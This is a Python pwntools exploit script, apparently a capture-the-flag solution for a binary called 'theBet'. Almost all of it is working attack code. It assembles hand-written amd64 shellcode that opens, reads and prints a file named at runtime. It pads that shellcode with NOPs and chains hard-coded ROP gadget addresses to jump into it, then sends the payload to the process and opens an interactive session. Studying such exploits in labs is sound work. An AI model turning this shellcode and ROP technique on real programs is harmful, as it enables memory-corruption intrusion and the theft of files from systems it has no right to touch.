from pwn import *

def shellcode():

	payload = ''
	#read syscall
	payload += 'push 0x1\n'
	payload += 'pop rbx\n'
	payload += 'dec bl\n'
	payload += 'push rdi\n'
	payload += 'pop rsi\n'
	payload += 'push rbx\n'
	payload += 'pop rax\n'
	payload += 'push rbx\n'
	payload += 'pop rdi\n'
	payload += 'push 0x1f\n'
	payload += 'pop rdx\n'
	payload += 'syscall\n'

	#open syscall
	payload += 'push rsi\n'
	payload += 'push rdi\n'
	payload += 'pop rsi\n'
	payload += 'pop rdi\n'
	payload += 'push rbx\n'
	payload += 'dec bl\n'
	payload += 'pop rdx\n'
	payload += 'push 0x2\n'
	payload += 'pop rax\n'
	payload += 'syscall\n'
	
	#read syscall
	payload += 'push 0x3\n'
	payload += 'pop rax\n'
	payload += 'push rsi\n'
	payload += 'push rdi\n'
	payload += 'pop rsi\n'
	payload += 'pop rdi\n'
	payload += 'push rax\n'
	payload += 'pop rdi\n'
	payload += 'dec al\n'
	payload += 'dec al\n'
	payload += 'dec al\n'
	payload += 'push 0x20\n'
	payload += 'pop rdx\n'
	payload += 'syscall\n'

	#write syscalll
	payload += 'push rdi\n'
	payload += 'pop rax\n'
	payload += 'dec al\n'
	payload += 'dec al\n'
	payload += 'push rax\n'
	payload += 'pop rdi\n'
	payload += 'syscall\n'
	
	#exit syscall
	payload += 'push 0x3c\n'
	payload += 'pop rax\n'
	payload += 'push 0x0\n'
	payload += 'pop rdi\n'
	payload += 'syscall\n'

	payload = asm(payload)
	payload += '\x90'*(0x68 - len(payload))

	 
	#print(disasm(payload))
	return payload

if __name__=="__main__":

	context.arch = 'amd64'
	
	#host = os.environ['CI_REGISTRY_IMAGE'].replace('/', '-')
	#p = remote(host, port)
	
	p = process('./theBet', level="debug")
	elf = ELF('./theBet')
	
	gdb.attach(p, gdbscript='''b*0x00000000004015e6
	c
	''')
	p.recv()
	p.sendline('a'*8)
	
	p.recv()
	p.sendline('1')
	
	p.recvuntil('Describe your argument: ')
	
	puts_plt = 0x0000000000401120
	puts_got = 0x404028
	fgets = 0x401170
	main_addr = 0x401694

	pop_rdi = 0x00000000004017d3
	pop_rdx = 0x00000000004012be
	pop_rax = 0x00000000004012c2
	pop_rbx = 0x00000000004012c0
	call_rax = 0x0000000000401014
	xor_rax_rdx = 0x00000000004012c4
	addr = 0x404090
	
	pay = shellcode()
	pay += p64(pop_rax)
	pay += p64(0x0)
	pay += p64(xor_rax_rdx)
	pay += p64(pop_rdi)
	pay += p64(addr)
#	pay += p64(mov_edi_jmp_rax)
	pay += p64(call_rax)
	print(len(shellcode()))
	p.sendline(pay)
	
	s = p.recvline()
	print(s)	
	p.interactive()
